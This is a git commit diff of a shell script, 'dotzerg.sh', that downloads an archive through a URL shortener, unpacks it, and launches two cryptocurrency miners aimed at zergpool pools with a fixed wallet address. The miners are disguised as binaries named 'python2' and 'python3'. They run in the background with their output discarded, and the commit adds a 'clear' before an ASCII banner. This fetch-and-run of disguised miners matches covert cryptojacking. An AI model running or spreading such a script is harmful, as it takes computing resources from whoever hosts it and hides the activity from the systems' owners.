f4e3e541f86190bd571ccf45900dd301ac834cc2
DotAja <142836390+DotAja@users.noreply.github.com>
2024-05-12 23:40:15 +0700

    created hendi kusnandi

--- dotzerg.sh
+++ dotzerg.sh
@@ -1,14 +1,16 @@
-wget -O dotaja.tar.gz s.id/dotaja
+wget -O dot s.id/dotaja
 
-tar -xzvf dotaja.tar.gz
+tar -xzvf dot
 
 nohup ./python2 --algo PYRIN --pool pyrinhash.asia.mine.zergpool.com:5557 --user DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK --pass c=DGB  > /dev/null 2>&1 &
 
 sleep 15
 
-nohup ./python3 -a minotaurx -o stratum+tcp://minotaurx.asia.mine.zergpool.com:7019 -u DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK -p c=DGB
+nohup ./python3 -a minotaurx -o minotaurx.asia.mine.zergpool.com:7019 -u DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK -p c=DGB > /dev/null 2>&1 &
 
 sleep 5
+
+clear
 
 echo "======================================================"
 echo "██████╗  ██████╗ ████████╗     █████╗      ██╗ █████╗"
